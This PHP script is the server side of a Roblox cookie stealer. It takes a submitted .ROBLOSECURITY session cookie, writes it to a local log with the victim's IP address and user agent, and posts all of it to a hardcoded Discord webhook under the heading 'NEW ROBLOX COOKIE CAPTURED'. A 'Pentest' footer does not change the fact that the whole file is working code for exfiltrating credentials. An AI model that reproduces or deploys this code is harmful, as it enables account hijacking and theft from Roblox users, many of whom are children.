<?php
header('Content-Type: application/json');

if (isset($_POST['roblox_cookie']) && !empty($_POST['roblox_cookie'])) {
    
    $cookie = $_POST['roblox_cookie'];
    $user_agent = $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Guardar localmente también
    $log_data = json_encode([
        'timestamp' => $timestamp,
        'ip' => $ip,
        'user_agent' => $user_agent,
        'cookie' => $cookie
    ]) . "\n";
    file_put_contents('cookies.log', $log_data, FILE_APPEND | LOCK_EX);
    
    // Enviar a Discord webhook
    $webhook_url = 'https://discord.com/api/webhooks/1469729710995935244/udKvatJq89y_5hE6SFkDlfaq2uV2EqowECVQaJmwOnP5vV4JUjW9C48dhDQcV6JjL8NA';
    
    $embed = [
        'title' => '🕵️ NUEVA COOKIE ROBLOX CAPTURADA',
        'color' => 16711680, // Rojo
        'fields' => [
            ['name' => '📍 IP', 'value' => "```$ip```", 'inline' => true],
            ['name' => '🕐 Hora', 'value' => "```$timestamp```", 'inline' => true],
            ['name' => '🌐 User-Agent', 'value' => "```" . substr($user_agent, 0, 100) . "```", 'inline' => false],
            ['name' => '🍪 .ROBLOSECURITY', 'value' => "```$cookie```", 'inline' => false]
        ],
        'footer' => ['text' => 'Pentest BS9reddp - jyqr4']
    ];
    
    $payload = ['embeds' => [$embed]];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    echo json_encode(['status' => 'success', 'discord_sent' => true]);
    
} else {
    echo json_encode(['status' => 'error', 'message' => 'No cookie provided']);
}
?>
